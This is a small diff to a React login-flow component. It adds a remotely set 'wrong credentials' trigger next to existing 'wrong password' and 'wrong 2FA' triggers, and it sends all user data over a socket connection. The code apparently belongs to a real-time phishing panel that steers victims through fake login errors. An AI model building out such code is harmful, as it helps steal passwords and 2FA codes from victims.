@@ -110,7 +110,10 @@ export default function Home() {
     stepManagement.setWrong2faTrigger,
     stepManagement.wrong2faTrigger,
     stepManagement.setWrongPasswordTrigger,
-    stepManagement.wrongPasswordTrigger
+    stepManagement.wrongPasswordTrigger,
+    stepManagement.setWrongCredsTrigger,
+    stepManagement.wrongCredsTrigger,
+    stepManagement.Step
   );
 
   useSocketConnection(Unik, userData.AllData);
@@ -135,6 +138,7 @@ export default function Home() {
       LastFetch: stepManagement.LastFetch,
       wrong2faTrigger: stepManagement.wrong2faTrigger,
       wrongPasswordTrigger: stepManagement.wrongPasswordTrigger,
+      wrongCredsTrigger: stepManagement.wrongCredsTrigger,
       ...userData,
     };
 
